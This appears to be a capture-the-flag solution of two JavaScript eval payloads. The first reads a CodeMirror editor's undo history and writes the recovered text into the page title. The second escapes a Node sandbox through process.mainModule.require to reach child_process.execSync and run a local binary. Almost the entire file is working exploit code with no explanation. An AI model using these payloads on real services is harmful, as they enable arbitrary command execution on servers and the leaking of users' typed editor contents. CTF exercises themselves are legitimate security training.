// Flag1
eval.call(null,
	'let history = document.getElementsByClassName("CodeMirror")[0].CodeMirror.doc.children[0].parent.children[0].parent.children[0].parent.history.done; let s = ""; for (var item of history) if (item.changes) s += item.changes[0].text[0]; document.title = s;'
)

// Flag2
eval.call(global,
	"const execSync = process.mainModule.require('child_process').execSync; console.log(execSync('./print_flag2', { encoding: 'utf-8' }));"
)
